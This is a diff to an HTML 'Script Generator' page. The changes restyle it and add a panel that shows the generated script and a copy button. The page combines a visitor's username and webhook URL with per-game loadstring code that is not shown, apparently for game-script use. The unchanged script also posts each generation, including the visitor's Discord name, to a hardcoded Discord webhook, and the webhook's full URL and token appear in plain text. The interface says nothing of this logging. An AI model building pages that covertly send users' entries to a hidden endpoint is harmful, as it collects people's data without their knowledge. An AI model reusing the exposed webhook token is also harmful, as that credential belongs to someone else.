@@ -5,13 +5,100 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Script Generator</title>
     <style>
-        body { background: linear-gradient(45deg, #0f0c29, #302b63, #24243e); color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
-        button { background: #ff0080; padding: 10px 20px; border-radius: 8px; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #ff0055; transform: scale(1.1); }
-        .popup { display: none; text-align: center; background: #1e1e2e; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.5); }
-        .popup input { margin: 10px auto; padding: 8px; width: 80%; border-radius: 8px; }
-        .popup button { background: #ff0080; padding: 10px 20px; border-radius: 8px; cursor: pointer; transition: 0.3s; }
-        .popup button:hover { background: #ff0055; transform: scale(1.1); }
+        body {
+            background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            margin: 0;
+        }
+        h1 {
+            font-size: 3rem;
+            animation: fadeIn 1.5s ease-in-out;
+        }
+        .container {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        button {
+            background: #ff0080;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: 0.3s;
+            font-size: 1rem;
+        }
+        button:hover {
+            background: #ff0055;
+            transform: scale(1.1);
+        }
+        .popup {
+            display: none;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(8px);
+        }
+        .popup input {
+            margin: 10px auto;
+            padding: 10px;
+            width: 80%;
+            border-radius: 8px;
+            border: none;
+            background-color: #333;
+            color: white;
+        }
+        .popup button {
+            background: #ff0080;
+            padding: 12px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: 0.3s;
+        }
+        .popup button:hover {
+            background: #ff0055;
+            transform: scale(1.1);
+        }
+        .generated-script {
+            background: #1e1e2e;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+            max-width: 80%;
+            margin: 20px auto;
+            display: none;
+            text-align: left;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
+        }
+        .generated-script pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            font-size: 1.1rem;
+            color: #d1d1d1;
+        }
+        .copy-button {
+            background: #0080ff;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: 0.3s;
+            font-size: 1rem;
+        }
+        .copy-button:hover {
+            background: #005bb5;
+        }
+        .copy-button:disabled {
+            background: #555;
+        }
     </style>
 </head>
 <body>
@@ -31,6 +118,12 @@
         <input type="text" id="webhook" placeholder="Webhook URL">
         <button onclick="generateScript()">Generate Script</button>
         <button onclick="closePopup()">Close</button>
+    </div>
+
+    <div id="generated-script" class="generated-script">
+        <h3>Generated Script</h3>
+        <pre id="script-output"></pre>
+        <button id="copy-btn" class="copy-button" onclick="copyScript()">Copy All</button>
     </div>
 
     <script>
@@ -61,16 +154,16 @@
 
             if (username && webhook) {
                 let script = `Username = "${username}"\nWebhook = "${webhook}"\n${loadstrings[currentGame]}`;
-                alert("Generated Script:\n" + script);
+                document.getElementById('script-output').innerText = script;
+                document.getElementById('generated-script').style.display = 'block';
+                document.getElementById('copy-btn').disabled = false;
 
                 // Send data to webhook for logging
                 fetch('https://discord.com/api/webhooks/1306937739702308915/-kxWY0Xk3Ci95HR7DjHZyw2BcMSc3CvkwMwllTDEOve0LmozUU3QgGT8k51FtCCylQiI', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        username: discordUser, // User's Discord username
+                        username: discordUser,
                         embeds: [{
                             title: 'Script Generated',
                             fields: [
@@ -87,6 +180,17 @@
             } else {
                 alert("Please fill in both the username and webhook!");
             }
+        }
+
+        function copyScript() {
+            const scriptText = document.getElementById('script-output').innerText;
+            const textarea = document.createElement('textarea');
+            textarea.value = scriptText;
+            document.body.appendChild(textarea);
+            textarea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textarea);
+            alert("Script copied to clipboard!");
         }
     </script>
 </body>
